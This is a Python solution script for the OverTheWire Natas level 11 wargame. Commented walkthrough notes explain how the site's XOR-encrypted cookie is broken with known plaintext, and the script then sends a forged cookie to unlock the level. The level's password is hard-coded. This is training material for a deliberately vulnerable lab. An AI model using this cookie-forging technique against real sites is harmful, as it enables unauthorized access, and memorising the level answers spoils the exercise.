#!/usr/bin/env python

import requests
import re
import base64
import urllib

username = 'natas11'
password = '1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg'
url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

"""Starting with our default stuff"""
#response = requests.get(url, auth = (username, password))
#content = response.text
#print(content)

"""Things of note right away, looks like we're setting a background color now on the webpage instead of returning something...ok
Probably more importantly, we see: "Cookies are protected with XOR encryption and we can view the source code if we want:"""
#response = requests.get(url + "index-source.html", auth = (username, password))
#content = response.text
#print(content)
"""Ok so what do we see here?
What we see is that this webpage is:
1) Initializing the cookies to deny access and set the color of the page to #ffffff
2) It is using a key to XOR the data of the cookie
So what does that mean for us? Well, XOR is a fairly simple math problem: a ^ b = c
Since we know what the data is of the default cookie, a and we know what c is because we can grab that from the webpage
We can do some basic algebra and change our problem to a ^ c = b to get the key.
Then we can take the default cookie data (encrypted) we're going to get below and XOR that with the default cookie data (plaintext)
which will give us our key so that we can then XOR that with the data we want (aka the cookie being marked 'yes')

So let's pull the cookie(s) real quick:"""
#response = session.get(url, auth = (username, password))
"""note this is slightly different, because we need to access just the value, this formats it a little nicer, as well"""
#print(session.cookies.get_dict())

"""Looks like we might need just the 'data' value, so let's get that now
The urllib step removes the extra characters at the end of the data value"""
#rawCookie = urllib.parse.unquote(session.cookies["data"])
#print(rawCookie)
"""This step base64 decodes the value which is then the raw data"""
#encryptedDefaultData = base64.b64decode(rawCookie)
#print(encryptedDefaultData)

"""Note: if you are looking at other solutions using a .encode('hex') that will not work in Python 3, must import codecs and use that instead
https://riptutorial.com/python/example/5809/encode-decode-to-hex-no-longer-available
this import and encoding takes the data and puts it into hex format so we can handle it further"""
#import codecs
#print(codecs.encode(encryptedDefaultData, 'hex'))

""" ——————————————————————————————————————— """
"""So at this point we have two options:
1) Use python to make our own XOR encrypt (which now that we have the solution could theoretically be easier to engineer and
might be a worthwhile exercise)
2) We can use the traditional method of modifying the php of this webpage (index-source.html) to do the heavy lifting for us. 

Either way, we'll end up with the below data that we wish to throw back at the server.
The data below simply 'yes' and our default webpage color XOR'd against the key"""
""" ——————————————————————————————————————— """
superSecureCookie = { "data" : "MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz" }
response = session.get(url, auth = (username, password), cookies = superSecureCookie)
content = response.text
print(content)






"""SDG"""

